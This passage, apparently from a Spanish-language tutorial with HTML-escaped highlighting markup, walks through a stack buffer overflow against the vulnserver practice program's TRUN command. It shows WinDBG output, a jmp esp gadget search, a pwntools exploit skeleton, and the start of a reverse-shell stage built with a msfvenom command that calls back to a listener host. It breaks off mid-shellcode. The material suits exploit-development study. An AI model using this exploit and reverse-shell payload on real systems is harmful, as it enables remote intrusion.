z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como se puede observar en el volcado de WinDBG, no tenemos ningún carácter que se interprete de manera errónea.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; db esp l100
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cf9c8  01 02 03 04 05 06 07 08-09 0a 0b 0c 0d 0e 0f 10  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cf9d8  11 12 13 14 15 16 17 18-19 1a 1b 1c 1d 1e 1f 20  ............... 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cf9e8  21 22 23 24 25 26 27 28-29 2a 2b 2c 2d 2e 2f 30  !&amp;quot;#$%&amp;amp;&amp;#39;()*+,-.&#x2F;0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cf9f8  31 32 33 34 35 36 37 38-39 3a 3b 3c 3d 3e 3f 40  123456789:;&amp;lt;=&amp;gt;?@
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa08  41 42 43 44 45 46 47 48-49 4a 4b 4c 4d 4e 4f 50  ABCDEFGHIJKLMNOP
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa18  51 52 53 54 55 56 57 58-59 5a 5b 5c 5d 5e 5f 60  QRSTUVWXYZ[\]^_`
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa28  61 62 63 64 65 66 67 68-69 6a 6b 6c 6d 6e 6f 70  abcdefghijklmnop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa38  71 72 73 74 75 76 77 78-79 7a 7b 7c 7d 7e 7f 80  qrstuvwxyz{|}~..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa48  81 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa58  91 92 93 94 95 96 97 98-99 9a 9b 9c 9d 9e 9f a0  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa68  a1 a2 a3 a4 a5 a6 a7 a8-a9 aa ab ac ad ae af b0  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa78  b1 b2 b3 b4 b5 b6 b7 b8-b9 ba bb bc bd be bf c0  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa88  c1 c2 c3 c4 c5 c6 c7 c8-c9 ca cb cc cd ce cf d0  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfa98  d1 d2 d3 d4 d5 d6 d7 d8-d9 da db dc dd de df e0  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfaa8  e1 e2 e3 e4 e5 e6 e7 e8-e9 ea eb ec ed ee ef f0  ................
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;010cfab8  f1 f2 f3 f4 f5 f6 f7 f8-f9 fa fb fc fd fe ff 01  ................
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;narly-jmp-esp&quot;&gt;Narly &amp;amp; JMP ESP&lt;a class=&quot;zola-anchor&quot; href=&quot;#narly-jmp-esp&quot; aria-label=&quot;Anchor link for: narly-jmp-esp&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Quedaría comprobar con narly, un script escrito en js para ver cuáles de los módulos que carga la aplicación tiene protecciones y cuáles no, en este caso solo están libres de protecciones la propia aplicación y un dll llamado &lt;code&gt;essfunc.dll&lt;&#x2F;code&gt;, que lo llama la el programa en ejecución.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; !nmod
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00400000 00407000 vulnserver           &#x2F;SafeSEH OFF                C:\vulnserver.exe
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;62500000 62508000 essfunc              &#x2F;SafeSEH OFF                C:\essfunc.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;734a0000 73544000 apphelp              &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\SYSTEM32\apphelp.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;74f10000 74f66000 mswsock              &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\system32\mswsock.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;75850000 75a87000 KERNELBASE           &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76190000 7624f000 msvcrt               &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\System32\msvcrt.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76330000 76393000 WS2_32               &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\System32\WS2_32.DLL
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76400000 764c0000 RPCRT4               &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\System32\RPCRT4.dll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76520000 765bd000 KERNEL32             &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;777b0000 7794f000 ntdll                &#x2F;SafeSEH ON  &#x2F;GS *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Con &lt;code&gt;-s&lt;&#x2F;code&gt; buscamos el código de operación &lt;code&gt;ff e4&lt;&#x2F;code&gt; que corresponde a jmp esp, se debe indicar el inicio de de la dirección del módulo y el final de la misma, adicionalmente podemos observar que están libres de bytes nulos.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; s -b 62500000 62508000 ff e4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011af  ff e4 ff e0 58 58 c3 5d-c3 55 89 e5 ff e4 ff e1  ....XX.].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011bb  ff e4 ff e1 5b 5b c3 5d-c3 55 89 e5 ff e4 ff e3  ....[[.].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011c7  ff e4 ff e3 5d 5d c3 5d-c3 55 89 e5 ff e4 ff e7  ....]].].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011d3  ff e4 ff e7 5b 5b c3 5d-c3 55 89 e5 ff e4 ff e2  ....[[.].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011df  ff e4 ff e2 59 5a c3 5d-c3 55 89 e5 ff e4 ff e6  ....YZ.].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011eb  ff e4 ff e6 59 58 c3 5d-c3 55 89 e5 ff e4 ff e5  ....YX.].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011f7  ff e4 ff e5 58 5a c3 5d-c3 55 89 e5 ff e4 ff e4  ....XZ.].U......
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;62501203  ff e4 ff e4 ff 64 24 f4-59 59 c3 5d c3 55 89 e5  .....d$.YY.].U..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;62501205  ff e4 ff 64 24 f4 59 59-c3 5d c3 55 89 e5 81 ec  ...d$.YY.].U....
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Escogeremos el segundo, pero ser puede elegir el que se prefiera.&lt;&#x2F;p&gt;
&lt;p&gt;El esqueleto del exploit quedaría de la siguiente forma:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;remote&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;192.168.1.131&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 0x396f4338 = 2006
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x41&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2006&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; junk
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-python&quot;&gt;0x&lt;&#x2F;span&gt;625011bb&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; eip -&amp;gt; jmp esp
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x43&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;3000&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; filler
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TRUN .&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;send&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En el volcado de WinDBG, podemos ver justo después del salto &lt;code&gt;jmp esp&lt;&#x2F;code&gt;, un salto incondicional, es decir siempre se va a ejecutar, van nuestras &lt;code&gt;\x43&lt;&#x2F;code&gt;, que es donde irá el shellcode.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; bp 0x625011bb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00ecf1e8 ebx=000000d8 ecx=00755370 edx=0000d28e esi=00401848 edi=00401848
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=625011bb esp=00ecf9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;essfunc!EssentialFunc3+0x3:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011bb ffe4            jmp     esp {00ecf9c8}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecf9c8  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecf9d8  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecf9e8  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecf9f8  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecfa08  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecfa18  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecfa28  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ecfa38  43434343 43434343 43434343 43434343
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;shell-inversa&quot;&gt;Shell inversa&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-inversa&quot; aria-label=&quot;Anchor link for: shell-inversa&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Quedaría cambiar las &lt;code&gt;\x43&lt;&#x2F;code&gt; por un shellcode real que podríamos generar con msfvenom.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;remote&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;192.168.1.131&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; msfvenom -p windows&#x2F;shell_reverse_tcp LHOST=192.168.1.48 LPORT=443 -b &amp;quot;\x00&amp;quot; -f python -v shellcode
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;  &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation 